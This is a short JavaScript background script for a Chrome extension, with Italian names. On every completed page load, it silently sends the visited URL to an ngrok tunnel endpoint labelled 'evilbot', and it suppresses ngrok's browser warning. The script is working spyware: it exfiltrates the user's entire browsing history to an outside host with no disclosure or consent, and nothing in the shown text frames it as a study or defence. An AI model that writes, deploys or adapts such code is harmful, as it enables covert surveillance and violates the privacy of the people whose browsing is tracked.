chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete" && tab.url && tab.url.startsWith("http")) {
    const urlPagina = tab.url;

    console.log("URL rilevato:", urlPagina);

    const baseUrl = 'https://5a7b-79-50-220-69.ngrok-free.app/evilbot';
    const params = {
        urlPage: urlPagina,
    };

    const url = new URL(baseUrl);
    Object.keys(params).forEach(key => url.searchParams.append(key, params[key]));

    fetch(url, {
        method: 'GET',
        headers: {
            'ngrok-skip-browser-warning': 'true'
        }
    });
  }
});
